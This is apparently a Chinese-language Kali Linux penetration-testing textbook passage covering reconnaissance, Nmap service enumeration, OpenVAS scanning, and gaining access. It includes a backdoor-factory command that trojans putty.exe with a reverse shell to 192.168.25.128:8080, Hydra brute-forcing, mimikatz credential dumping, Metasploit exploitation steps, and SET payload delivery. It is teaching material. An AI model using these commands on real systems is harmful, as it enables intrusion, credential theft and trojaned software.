![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/33cf052d-e084-498f-8141-10d27c8f8589.jpg)

# 站点存档和回溯

对于任何给定的网站来说，定期进行更改是非常常见的。通常，当网站更新时，终端用户无法看到其先前的版本。然而，该网站[`archive.org/`](https://archive.org/)可以让您查看给定网站的以前版本。这可能会揭示一些您正在寻找的信息，但在网站的最新版本中并不存在：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/23682cd4-0ad3-49ab-80b9-7ed1aeba195a.jpg)

# 网站元数据

获取目标网站的元数据可以提供大量有用的信息。该网站[`desenmascara.me`](http://desenmascara.me)为任何给定的目标网站提供元数据。元数据通常包括域信息、标头标志等，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/1b35359a-f937-4292-b20d-bf8d75b951a7.jpg)

# 使用 Shodan 查找易受攻击的系统

Shodan 是一个可以从漏洞利用的角度提供非常有趣结果的搜索引擎。Shodan 可以有效地用于查找所有互联网连接设备的弱点，如网络摄像头、IP 设备、路由器、智能设备、工业控制系统等。Shodan 可以在[`www.shodan.io/.`](https://www.shodan.io/)上访问

以下截图显示了 Shodan 的主屏幕。您需要创建一个帐户并登录以发出搜索查询：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/d6d70e60-14b0-40db-8133-8ada5c5024e3.jpg)

如下截图所示，Shodan 提供了一个开箱即用的 Explore 选项，提供了属于最受欢迎搜索查询的搜索结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/4369fc82-cba1-4f71-b4d6-ac6f80a68ca5.jpg)

以下截图显示了在线网络摄像头的搜索结果。搜索结果可以根据其地理位置进一步分类：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/a231e2d6-d514-48cd-81de-2af9a374736f.png)

# 使用 Maltego 进行高级信息收集

Maltego 是一个非常强大、有能力和专业的信息收集工具。默认情况下，它是 Kali Linux 的一部分。Maltego 有许多信息来源，可以为任何给定的目标收集信息。从 Maltego 的角度来看，目标可以是姓名、电子邮件地址、域、电话号码等。

您需要注册一个免费帐户才能访问 Maltego。

以下截图显示了 Maltego 的主屏幕：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/2acb4c8c-b18d-4479-8fc9-4f427bc4a8eb.png)

以下截图显示了对域[`www.paterva.com`](https://www.paterva.com)的样本搜索结果。在 Maltego 中，搜索查询被称为**transform**。一旦转换完成，它会呈现所获得信息的图形。图的所有节点都可以根据需要进一步转换：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/7e709cbe-a4c3-4d39-8b5e-741cbfd658f8.png)

# theHarvester

拥有属于目标系统/组织的电子邮件地址可能在渗透测试的后续阶段中证明是有用的。theHarvester 帮助我们收集属于我们目标系统/组织的各种电子邮件地址。它使用各种在线来源来收集这些信息。以下截图显示了 theHarvester 的各种参数：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/bc6e9e9b-1c3b-4560-8228-34d0ee8f27e3.png)

```
root@kali:~# theharvester -d demo.testfire.net -l 20 -b google -h output.html
```

上述语法将在域[demo.testfire.net](http://demo.testfire.net)上执行`theharvester`，并使用 Google 作为搜索引擎查找最多 20 个电子邮件 ID，然后将输出存储在`output.html`文件中。

# 主动信息收集

与被动信息收集不同，后者涉及中间系统来收集信息，主动信息收集涉及与目标的直接连接。客户端直接与目标探测信息，中间没有系统。虽然这种技术可能比被动信息收集揭示更多信息，但目标系统总是有可能触发安全警报。由于与目标系统有直接连接，所有信息请求都将被记录，以后可以追溯到来源。下图描述了主动信息收集，其中客户端直接探测目标系统：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/542f5afd-3091-4df4-81fe-38c4d29a2c08.png)

# 使用 SPARTA 进行主动信息收集

SPARTA 是一个出色的主动信息收集工具。它是默认的 Kali 设置的一部分。以下屏幕截图显示了 SPARTA 的主屏幕。在左窗格中，您可以简单地添加要探测的 IP/host：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/3d9279c5-aaaa-43c9-8ba0-ec456b281166.png)

在将 IP/host 输入 SPARTA 后，它会迅速触发各种工具和脚本，从 Nmap 开始。它会进行快速端口扫描，并进行服务识别。它还提供目标可能正在运行的各种 Web 界面的截图，最有趣的是，它还会自动尝试检索目标系统上运行的各种服务的密码。

以下屏幕截图显示了 SPARTA 扫描中的样本结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/b62518f4-daa2-430c-8501-98345f57c5ae.png)

# Recon-ng

Recon-ng 是一个非常强大和灵活的工具，能够进行被动和主动信息收集。它有许多模块，可以插入并触发以按需收集信息。它的功能与 Metasploit 非常相似。

以下屏幕截图显示了作为 Recon-ng 一部分的各种模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/7a8cebdf-2c44-45f4-8160-75a80a0fe739.png)

我们可以选择我们喜欢的任何模块，然后执行它，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/531deaa9-fb62-48ca-9c08-bce9d4370d3a.png)

Recon-ng 确实是一个提供有关目标系统丰富信息的工具。您可以探索 Recon-ng 的各种模块，以更好地了解其方面和可用性。

# Dmitry

Dmitry 是 Kali Linux 中的另一个多才多艺的工具，能够进行被动和主动信息收集。它可以执行 whois 查找和反向查找。它还可以搜索子域、电子邮件地址，并进行端口扫描。如下图所示，它非常易于使用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/040c7da3-255e-4993-8e21-661ecd8e9434.png)

```
root@kali:~# dmitry -wn -o output.txt demo.testfire.ne
```

前面的命令执行了 whois 查找，并从 Netcraft 检索了站点信息，然后将输出写入文件`output.txt`。

# 总结

在本章中，我们了解了信息收集的重要性，以及被动和主动信息收集等各种类型的信息收集。我们还研究了使用各种工具来协助我们进行信息收集的过程。


# 第十三章：枚举和漏洞评估

本章是关于探索枚举范围内目标的各种工具和技术，并对其进行漏洞评估。

读者将学习如何使用本章讨论的各种工具和技术枚举目标系统，并将学习如何使用专门的工具（如 OpenVAS）来评估漏洞。

本章将涵盖以下主题：

+   什么是枚举

+   枚举服务

+   使用 Nmap 脚本

+   使用 OpenVAS 进行漏洞评估

# 什么是枚举？

我们已经在上一章中看到了信息收集的重要性。一旦我们对目标有了一些基本信息，枚举就是下一个逻辑步骤。例如，假设国家 A 需要对国家 B 发动攻击。现在，国家 A 进行了一些侦察工作，并得知国家 B 有 25 枚能够进行还击的导弹。现在，国家 A 需要确切地了解国家 B 的导弹是什么类型、制造商和型号。这种枚举将帮助国家 A 更精确地制定攻击计划。

同样，在我们的情况下，假设我们已经知道我们的目标系统在端口`80`上运行某种 Web 应用程序。现在我们需要进一步枚举它是什么类型的 Web 服务器，应用程序使用的是什么技术，以及其他相关细节。这将帮助我们选择准确的漏洞利用并攻击目标。

# 枚举服务

在开始枚举目标上的服务之前，我们将在目标系统上进行快速端口扫描。这次，我们将使用一个名为**Unicornscan**的工具，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/11715f84-e61d-48dd-86f6-dfca1b5ceb2c.png)

端口扫描返回了我们目标系统上开放端口的列表，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/b4bd5d15-f974-4f0a-aa4f-4b60ff7208af.png)

现在我们已经获得了目标系统上开放端口的列表，下一个任务是将这些开放端口对应的服务进行关联，并进一步枚举它们的版本。枚举服务非常关键，因为它为进一步的攻击奠定了坚实的基础。在本节中，我们将讨论使用 Nmap 枚举各种服务的技术。 

# HTTP

**超文本传输协议**（**HTTP**）是用于提供网络内容的最常见的协议。默认情况下，它在端口`80`上运行。枚举 HTTP 可以揭示许多有趣的信息，包括它正在提供的应用程序。

Nikto 是一个专门用于枚举 HTTP 服务的工具，它是默认 Kali Linux 安装的一部分。以下截图显示了 Nikto 工具中各种可用选项：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/a73507db-7fa9-4b89-b9ca-d37464abe714.png)

我们可以使用`nikto -host <目标 IP 地址>`命令来枚举 HTTP 目标，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/270978a8-4812-41fe-9d4f-145c408a3dc5.png)

Nmap 也可以有效地用于枚举 HTTP。以下截图显示了使用 Nmap 脚本执行的 HTTP 枚举。语法如下：

```
nmap --script http-enum <Target IP address>
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/e43f8871-efe8-4df3-8e18-fa3f2f176f86.png)

`http-enum` Nmap 脚本的输出显示了服务器信息以及各种有趣的目录，可以进一步探索。

# FTP

**文件传输协议**（**FTP**）是用于在系统之间传输文件的常用协议。FTP 服务默认在端口`21`上运行。枚举 FTP 可以揭示有趣的信息，如服务器版本以及是否允许匿名登录。我们可以使用 Nmap 来枚举 FTP 服务，语法如下：

```
nmap -p 21 -T4 -A -v <Target IP address>
```

以下截图显示了使用 Nmap 枚举 FTP 的输出。它显示 FTP 服务器是 vsftpd 2.3.4，并且允许匿名登录：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/ce123056-c328-4471-b55a-e6746f6fc040.png)

# SMTP

**简单邮件传输协议**（**SMTP**）是负责传输电子邮件的服务。该服务默认运行在端口`25`上。枚举 SMTP 服务以了解服务器版本以及其接受的命令是有用的。我们可以使用以下 Nmap 语法来枚举 SMTP 服务：

```
nmap -p 25 -T4 -A -v <Target IP address>
```

以下截图显示了我们发出的枚举命令的输出。它告诉我们 SMTP 服务器是 Postfix 类型，并给出了它接受的命令列表：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/2b09fbb2-d6f6-403d-affb-4ba1edebefc6.png)

# SMB

**服务器消息块**（**SMB**）是一个非常常用的用于共享文件、打印机、串口等服务。从历史上看，它一直容易受到各种攻击。因此，枚举 SMB 可以为进一步精确的攻击计划提供有用的信息。为了枚举 SMB，我们将使用以下语法并扫描端口`139`和`445`：

```
nmap -p 139,445 -T4 -A -v <Target IP address>
```

以下截图显示了我们的 SMB 枚举扫描的输出。它告诉我们正在使用的 SMB 版本和工作组详细信息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/6a1acfcc-eaaa-45f9-ae2c-0eab66db304a.png)

# DNS

**域名系统**（**DNS**）是最广泛使用的用于将域名转换为 IP 地址和反之的服务。DNS 服务默认运行在端口`53`上。我们可以使用以下 Nmap 语法来枚举 DNS 服务：

```
nmap -p 53 -T4 -A -v <Target IP address>
```

以下截图显示了目标系统上 DNS 服务器的类型是 ISC bind 版本 9.4.2：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/51bb6af3-99bb-4ad5-9fbd-7553f54d7d7d.png)

# SSH

**安全外壳**（**SSH**）是用于在两个系统之间安全传输数据的协议。这是 Telnet 的有效和安全替代方案。SSH 服务默认运行在端口`22`上。我们可以使用以下 Nmap 语法来枚举 SSH 服务：

```
nmap -p 22 -T4- A -v <Target IP address>
```

以下截图显示了我们执行的 SSH 枚举命令的输出。它告诉我们目标正在运行 OpenSSH 4.7p1：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/71467a9c-eaec-4f82-aac4-ec5c49515034.png)

# VNC

**虚拟网络计算**（**VNC**）主要用于远程访问和管理的协议。VNC 服务默认运行在端口`5900`上。我们可以使用以下 Nmap 语法来枚举 VNC 服务：

```
nmap -p 5900 -T4 -A -v <Target IP address>
```

以下截图显示了我们执行的 VNC 枚举命令的输出。它告诉我们目标正在运行协议版本为 3.3 的 VNC：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/38569288-0ad9-4a6c-b3f6-f7e583be409c.png)

# 使用 Nmap 脚本

Nmap 不仅仅是一个普通的端口扫描程序。它在提供的功能方面非常多样化。Nmap 脚本就像附加组件，可以用于执行额外的任务。实际上有数百个这样的脚本可用。在本节中，我们将看一些 Nmap 脚本。

# http-methods

`http-methods`脚本将帮助我们枚举目标 Web 服务器上允许的各种方法。使用此脚本的语法如下：

```
nmap --script http-methods <Target IP address>
```

以下截图显示了我们执行的 Nmap 脚本的输出。它告诉我们目标 Web 服务器允许 GET、HEAD、POST 和 OPTIONS 方法：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/7558ad10-6dbf-4dcf-b857-ca64fbe482e9.png)

# smb-os-discovery

`smb-os-discovery`脚本将帮助我们根据 SMB 协议枚举操作系统版本。使用此脚本的语法如下：

```
nmap --script smb-os-discovery <Target IP address>
```

以下截图显示了枚举输出，告诉我们目标系统正在运行基于 Debian 的操作系统：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/adbaef84-5346-4ef3-8c35-ecbd0b04a9a6.png)

# http-sitemap-generator

`http-sitemap-generator`脚本将帮助我们创建目标 Web 服务器上托管的应用程序的分层站点地图。使用此脚本的语法如下：

```
nmap --script http-sitemap-generator <Target IP address>
```

以下截图显示了在目标 Web 服务器上托管的应用程序生成的站点地图：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/8ef60b9c-5f25-4f4b-9403-82d277d09f6f.png)

# mysql-info

`mysql-info`脚本将帮助我们枚举 MySQL 服务器，并可能收集服务器版本、协议和盐等信息。使用此脚本的语法如下：

```
nmap --script mysql-info <Target IP address>
```

下面的屏幕截图显示了我们执行的 Nmap 脚本的输出。它告诉我们目标 MySQL 服务器版本是`5.0.51a-3ubuntu5`，还告诉了盐的值：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/d9c98ad8-d2d3-48f8-a626-f2118ff52415.png)

# 使用 OpenVAS 进行漏洞评估

现在我们已经熟悉了枚举，下一个逻辑步骤是执行漏洞评估。这包括探测每个服务可能存在的开放漏洞。有许多商业和开源工具可用于执行漏洞评估。一些最受欢迎的工具包括 Nessus、Nexpose 和 OpenVAS。

OpenVAS 是一个由多个工具和服务组成的框架，提供了一种有效和强大的漏洞管理解决方案。有关 OpenVAS 框架的更详细信息，请访问[`www.openvas.org/`](http://www.openvas.org/)。

最新的 Kali Linux 发行版默认不包含 OpenVAS。因此，您需要手动安装和设置 OpenVAS 框架。以下是您可以在 Kali Linux 或任何基于 Debian 的 Linux 发行版上使用的一组命令：

```
root@kali:~#apt-get update
root@kali:~#apt-get install openvas
root@kali:~#openvas-setup
```

在终端中运行上述命令后，OpenVAS 框架应该已经安装并准备就绪。您可以通过浏览器访问`https://localhost:9392/login/login.html`URL，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/ecc606f5-6a9b-4191-a722-74f84301ca3c.png)

输入凭据后，您可以看到初始仪表板，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/50e488c1-28c0-4dac-a9c9-e60c803eb5ca.png)

现在是时候开始第一次漏洞扫描了。为了启动漏洞扫描，打开任务向导，如下面的屏幕截图所示，并输入要扫描的目标的 IP 地址：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/7939d8d6-984e-4ad6-a2a6-fb9b9426dd77.png)

一旦在任务向导中输入了目标 IP 地址，扫描就会触发，并且可以跟踪进度，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/e9000655-5aaf-4ac3-aaac-eccdc7cb97c4.png)

在扫描进行中，您可以查看仪表板，以获取扫描期间发现的漏洞的摘要，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/86b205e0-95ef-4be9-8508-a86a940b5388.png)

扫描完成后，您可以检查结果，查看所有详细的发现以及严重级别。您可以单击每个漏洞以获取更多详细信息，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/ecf61831-bd12-4000-8ac0-539b9f412947.png)

# 摘要

在本章中，我们学习了枚举的重要性，以及在目标系统上执行有效枚举的各种工具和技术。我们还概述了 OpenVAS 漏洞管理框架，该框架可用于执行有针对性的漏洞评估。


# 第十四章：获取网络访问

在这一章中，我们将深入了解如何利用各种技术和隐蔽通道获取对被入侵系统的访问权限。我们将学习获取对被入侵系统访问权限所需的各种技能，包括密码破解、生成后门和使用欺骗性社会工程技术。

我们将在本章中涵盖以下主题：

+   获取远程访问

+   破解密码

+   使用后门工厂创建后门

+   使用 Metasploit 利用远程服务

+   使用 RouterSploit 黑客嵌入式设备

+   使用 SET 进行社会工程

# 获取远程访问

到目前为止，在本书中，我们已经看到了各种技术和工具，可以用来收集有关目标的信息并枚举系统上运行的服务。我们还瞥见了使用 OpenVAS 进行漏洞评估的过程。在遵循了这些阶段之后，我们现在应该已经有足够的信息来实际上入侵系统并获取访问权限。

可以通过以下两种方式之一实现对远程系统的访问：

+   直接访问

+   路由器后面的目标

# 直接访问

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/07e148ba-258f-4361-ba21-5c7b0e1d1d62.png)

在这种类型中，攻击者直接访问目标系统。攻击者基本上知道目标系统的 IP 地址并远程连接到它。攻击者然后利用目标系统上的现有漏洞来进一步获取访问权限。

# 路由器后面的目标

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/d8a21e20-2101-4e33-b0bc-818cebe7a0ca.jpg)

在这种情况下，目标机器位于启用了**网络地址转换**（**NAT**）的路由器或防火墙后面。目标系统具有私有 IP 地址，并且不能直接通过互联网访问。攻击者只能到达路由器/防火墙的公共接口，但无法到达目标系统。在这种情况下，攻击者将不得不通过电子邮件或信使向受害者发送某种有效载荷，一旦受害者打开有效载荷，它将通过路由器/防火墙返回到攻击者的反向连接。

# 破解密码

密码是用于将用户认证到系统中的基本机制之一。在我们的信息收集和枚举阶段，我们可能会遇到目标上运行的各种受密码保护的服务，如 SSH、FTP 等。为了获取对这些服务的访问权限，我们将使用以下一些技术来破解密码：

+   **字典攻击**：在字典攻击中，我们向密码破解器提供一个包含大量单词的文件。密码破解器然后尝试将提供的文件中的所有单词作为目标系统上的可能密码。如果匹配成功，我们将得到正确的密码。在 Kali Linux 中，有几个可以用于密码破解的字典。这些字典位于`/usr/share/wordlists`中，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/1edc9e1f-b289-4e44-a010-ad8a88884d4f.png)

+   **暴力破解攻击**：如果密码不是我们提供的字典中的任何一个单词，那么我们可能需要发起一个暴力破解攻击。在暴力破解攻击中，我们首先指定最小长度、最大长度和自定义字符集。密码破解器然后尝试使用这个字符集中形成的所有排列和组合作为目标上的可能密码。然而，这个过程需要大量资源和时间。

+   **彩虹表**：密码从不以纯文本格式存储在系统中。它始终使用某种算法进行哈希处理，以使其无法读取。彩虹表中包含给定字符集内密码的预先计算的哈希值。如果我们从目标系统获得密码哈希值，那么我们可以将它们输入到彩虹表中。彩虹表将尝试在其现有哈希表中寻找可能的匹配项。这种方法的速度比暴力破解要快得多，但需要大量的计算资源和存储空间来存储彩虹表。此外，如果密码哈希值与盐一起存储，彩虹表将被击败。

# 识别哈希

正如我们在前一节中学到的，密码从不以纯文本格式存储，而是始终使用某种算法进行哈希处理。为了破解密码哈希，我们首先必须确定使用了什么算法来对密码进行哈希处理。Kali Linux 有一个名为`hash-identifier`的工具，它以密码哈希作为输入，并告诉我们可能使用的哈希算法，如下图所示：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/5ea1c199-1562-47f2-9a65-33191e305d05.png)

# 破解 Windows 密码

Windows 操作系统将密码存储在一个名为**安全帐户管理器**（**SAM**）的文件中，使用的哈希算法类型是 LM 或 NTLM。

我们首先利用远程 Windows 系统中的 SMB 漏洞，并使用 Metasploit 获得 Meterpreter 访问，如下图所示。Meterpreter 有一个非常有用的实用程序称为`mimikatz`，可以用来从受损系统中转储哈希或甚至纯文本密码。我们使用命令`load mimikatz`来启动此工具。然后我们使用命令`kerberos`来显示纯文本凭据。我们得知用户`shareuser`的密码是`admin`。使用`msv`命令，我们还可以从受损系统中转储原始哈希。

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/e48e8443-7460-457a-a3da-5963f34ca50e.png)

# 密码分析

在前一节中，我们已经了解了字典攻击。在与组织的特定参与过程中，我们可能会确定所有密码都使用某种特定模式。因此，我们可能希望有一个与特定模式相匹配的单词列表。密码分析帮助我们生成与特定模式对齐的单词列表。

Kali Linux 有一个名为 crunch 的工具，可以帮助我们使用自定义模式生成单词列表。

```
crunch 3 5 0123456789abcdefghijklmnopqrstuvwxyz
```

上述语法将生成一个单词列表，其中单词的最小长度为`3`，最大长度为`5`，并包含来自字符集`0123456789abcedefghijklmnopqrstuvwxyz`的所有可能的排列和组合。有关更多帮助，我们可以使用`man crunch`命令参考 crunch 帮助，如下图所示：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/28d696ec-ba0d-464c-bc8c-74169eb15601.png)

# 使用 Hydra 进行密码破解

Hydra 是默认 Kali Linux 安装的一个非常强大和高效的密码破解工具。Hydra 能够破解各种协议的密码，如 FTP、SSH、HTTP 等。Hydra 可以从终端启动，如下图所示：

```
hydra -l user -P passlist.txt ftp://192.168.25.129
```

上述命令将对运行在 IP 地址`192.168.25.129`上的 FTP 服务器发起密码破解攻击，并尝试使用单词列表`passlist.txt`中的所有密码。

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/8336a925-45e9-433d-ae5e-7b330f546345.png)

# 使用后门工厂创建后门

快速查看单词*后门*的词典含义给我们带来了*通过间接或不诚实手段实现*。在计算世界中，后门是隐藏的，用于秘密进入系统的东西。例如，如果我们从某个不知名的人那里得到一个普通的可执行文件，我们可能会感到怀疑。但是，如果我们得到一个看起来很真实的安装程序，我们可能会执行它。然而，该安装程序可能有一个隐藏的后门，可能会打开我们的系统给攻击者。

创建后门通常涉及使用我们的 shellcode 对真实的可执行文件进行修补。Kali Linux 有一个特殊的工具`backdoor-factory`，可以帮助我们创建后门。`backdoor-factory`可以从终端启动，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/b8828717-27b8-4953-9444-5adcae216d36.png)

现在我们执行如下图所示的命令：

```
root@kali:~# backdoor-factory -f /root/Desktop/putty.exe -s reverse_shell_tcp_inline -H  192.168.25.128 -P 8080
```

这个命令将打开位于`/root/Desktop`的`putty.exe`文件，将反向 TCP shell 注入可执行文件，并配置后门连接到 IP 地址`192.168.25.128`的端口`8080`。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/449ab564-d3ff-4dc3-ac34-02f899f8c991.png)

# 利用 Metasploit 利用远程服务

在我们继续利用远程目标系统上的服务之前，我们必须知道所有服务正在运行的情况以及它们的确切版本是什么。我们可以通过快速进行 Nmap 扫描来列出服务版本信息，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/1f5eb0a3-9ef4-43cf-b24e-866fbdbc4d18.png)

前面的结果显示有许多正在运行的服务，我们可以利用 Metasploit 进行攻击。

# 利用 vsftpd

通过 Nmap 扫描和枚举，我们得知我们的目标正在运行 FTP 服务器。服务器版本是 vsftpd 2.3.4，活动在端口`21`上。我们使用`msfconsole`命令打开 Metasploit 框架，然后搜索与 vsftp 匹配的任何漏洞，如下图所示。Metasploit 有一个`vsftpd_234_backdoor`漏洞，我们可以用来攻击目标。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/259023a6-5f31-4e3f-9422-fc5126c83c4c.png)

我们选择 vsftp 漏洞，并将`RHOST`参数设置为目标的 IP 地址。然后我们运行漏洞，如下图所示。漏洞利用成功，并打开了一个命令 shell。使用`whoami`命令，我们可以知道我们已经获得了对目标的 root 访问权限。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/864c6961-227f-4496-9ba0-5c1aedfa92a4.png)

# 利用 Tomcat

通过 Nmap 扫描和枚举，我们得知我们的目标正在运行 Apache Tomcat Web 服务器。它在端口`8180`上活动。我们可以通过浏览器在端口`8180`上击中目标 IP，并查看 Web 服务器的默认页面，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/48a49955-7d12-40fc-8b78-f2862cef598b.png)

现在我们打开 Metasploit 控制台，并搜索与 Tomcat 服务器匹配的任何漏洞，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/db477a4a-6134-4a36-a98a-e6b744834105.png)

我们将使用`tomcat_mgr_deploy`漏洞，如下图所示。我们隐式选择`java/meterpreter/reverse_tcp`作为漏洞载荷，然后配置其他选项，如 RHOST、LHOST、默认用户名/密码和目标端口。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/5dfde7ad-287c-411e-b0a6-7ac4d00c3cca.png)

漏洞利用成功，并给我们一个 Meterpreter 会话。

# 使用 RouterSploit 黑客嵌入式设备

在前一节中，我们学习了如何有效地使用 Metasploit 来利用远程服务。目标主要是 Windows 和 Linux 操作系统。互联网连接设备的数量正在迅速增加。这些设备具有嵌入式固件，也容易受到攻击。

RouterSploit 是一个命令行工具，可用于攻击嵌入式设备。但它不是默认安装在 Kali Linux 中的一部分。我们可以使用`apt-get install routersploit`命令安装 RouterSploit。安装后，可以通过在终端中输入`routersploit`来启动它，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/24f5b3ff-54d5-4500-95ed-006fc1b4bcf0.png)

RouterSploit 具有与 Metasploit 控制台非常相似的界面。我们可以使用`scanners/autopwn`选项快速扫描目标设备，如下图所示。我们只需设置目标 IP 地址并运行扫描程序。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/fb3bd827-da78-4682-8653-49bc1cabbf03.png)

# 使用 SET 进行社会工程学

在本章的第一节中，我们看到了两种可能的利用场景。攻击者要么直接访问目标系统，要么目标系统在路由器/防火墙后面，攻击者只能达到路由器/防火墙的公共接口。

在第二种情况下，攻击者必须向受害者发送某种有效载荷，并诱使他执行有效载荷。一旦执行，它将建立一个反向连接返回给攻击者。这是一种隐秘的技术，涉及社会工程的使用。

Kali Linux 提供了一个执行各种社会工程攻击的优秀框架。社会工程工具包可以在“应用程序|利用工具|SET”中访问。

SET 的初始屏幕显示了与社会工程攻击相关的各种选项，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/a49ffa50-d0a5-4aa3-b225-17994962a780.png)

我们选择选项`1)社会工程攻击`，然后会出现一系列攻击，如下图所示：

SET 会自动启动 Metasploit 并开始监听。一旦我们的受害者下载并执行有效载荷，一个 Meterpreter 会话就会打开，如下图所示： 

我们选择选项`4)创建有效载荷和监听器`，然后选择有效载荷`Windows Shell Reverse_TCP`。然后我们设置监听器的 IP 地址和端口，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/af9b11b1-991a-4554-9aaf-b6d01256f4f9.png)

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/1284b55e-b5ec-44aa-8020-e6fe449da437.png)

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/1a408fa9-ea5b-49e6-9798-ca58e1745269.png)

# 总结

在本章中，我们介绍了各种工具和技术，用于获取对目标系统的访问权限，包括破解密码、创建后门、利用服务和发动社会工程攻击。


# 第十五章：评估网络应用安全

本章是关于学习网络应用安全的各个方面。我们将学习从安全角度评估网络应用的技能，并使用自动化和手动技术揭示潜在的缺陷。

我们将在本章中涵盖以下主题：

+   网络应用安全测试的重要性

+   应用程序配置文件

+   常见的网络应用安全测试工具

+   认证

+   授权

+   会话管理

+   输入验证

+   安全配置错误

+   业务逻辑缺陷

+   审计和日志记录

+   密码学

+   测试工具

# 网络应用安全测试的重要性

